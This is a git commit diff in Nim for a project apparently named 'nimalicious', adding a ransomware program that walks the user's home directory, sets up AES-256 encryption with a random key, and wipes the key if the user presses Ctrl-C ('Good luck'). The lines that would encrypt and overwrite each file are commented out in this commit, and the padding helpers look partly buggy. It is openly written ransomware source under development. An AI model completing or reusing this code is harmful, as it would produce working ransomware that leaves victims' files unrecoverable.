e34c4515d355febd7439ca82a97a6d5bca9dd152
penguinite <penguinite@tuta.io>
2024-01-18 13:50:42 +0100

    wip: some more work

--- src/gen_ransom.nim
+++ src/gen_ransom.nim
@@ -1,13 +1,47 @@
 # This is just an example to get you started. A typical binary package
 # uses this file as the main entry point of the application.
-
 import nimalicious/[consent, crypto]
+import nimcrypto
 
 askConsent(
   "gen_random",
   ransomwareDangers
 )
 
-var algo: Algo = init(Ransomware)
 
-echo algo.encrypt("Hello World!")
+when defined(debug):
+  # Make a dummy file specifically to be encrypted and decrypted.
+  proc findFiles*(): seq[string] =
+    try:
+      writeFile("dummy_file.txt", "Hello World!")
+      return @["dummy_file.txt"]
+    except:
+      # Return nothing as a safe measure.
+      return @[]
+
+else:
+  import std/os
+  # Search *everywhere* in the user's home directory.
+  proc findFiles*(): seq[string] =
+    for kind, path in walkDir(dir = getHomeDir(), skipSpecial = true):
+      if kind == pcFile: result.add(path)
+    return result
+
+# Initialize encryption.
+var algo: ECB[aes256]
+algo.init(genKey())
+
+proc exit() {.noconv.} =
+  echo "Clearing encryption key since you tried to exit. Good luck."
+  when not defined(debug): algo.clear()
+setControlCHook(exit)
+
+
+
+for file in findFiles():
+  var
+    contents = autoPadStr(readFile(file))
+    tmp = newString(len(contents))
+  echo contents
+#  algo.encrypt(contents, tmp)
+#  writeFile(file, tmp)
--- src/nimalicious/crypto.nim
+++ src/nimalicious/crypto.nim
@@ -1,54 +1,34 @@
-import nimcrypto, std/[sysrand, base64]
+import std/[sysrand, base64, strutils]
 
-type
-  Usecase* = enum
-    Ransomware, # Use AES256 encryption and stuff.
-  
-  Algo* = object
-    case use*: Usecase
-    of Ransomware:
-      rnsk*: CBC[aes256]
-    key: string
-
-proc genKey*(use: Usecase): string =
-  var limit: int
-  case use:
-  of Ransomware:
-    limit = 256
-
-  for bite in urandom(limit):
-    result.add(encode($bite))
+proc genKey*(limit: int = 256): string =
+  for ch in encode(urandom(limit)):
+    result.add(ch)
     if len(result) >= limit:
-      var cut = len(result)
-      if not cut <= 0:
-        result = result[0..^cut]
+      result = result[0..limit - 1]
       break
-
   return result
 
-proc init*(use: Usecase, key: string = genKey(use)): Algo =
-  case use:
-  of Ransomware:
-    result = Algo(use: Ransomware)
-    result.rnsk.init(key)
-    result.key = key
+proc autoPad*(input: string, segmentSize: int = 256): seq[string] =
+  var
+    i = 0
+    tmp = ""
 
-
-proc encrypt*(algo: Algo, str: string): string =
-  case algo.use:
-  of Ransomware:
-    algo.rnsk.encrypt(str, result)
+  for ch in input:
+    tmp.add(ch)
+    inc i
+    if len(tmp) == segmentSize:
+      result.add(tmp)
+      tmp = ""
+  
+  if len(tmp) > 0: result.add(tmp)
+  
+  # Re-size first/last segment if its too small
+  if result[high(result)].len() < segmentSize:
+    let diff = segmentSize - result[high(result)].len()
+    for i in 0..diff:
+      result[high(result)].add('\0')
   return result
 
-proc decrypt*(algo: Algo, str: string): string =
-  case algo.use:
-  of Ransomware:
-    algo.rnsk.decrypt(str, result)
-  return result
+proc autoPadStr*(input: string, segmentSize: int = 256): string =
+  return autoPad(input, segmentSize).join
 
-proc clear*(algo: Algo): Algo =
-  result = algo
-  case result.use:
-  of Ransomware:
-    result.rnsk.clear()
-  return result
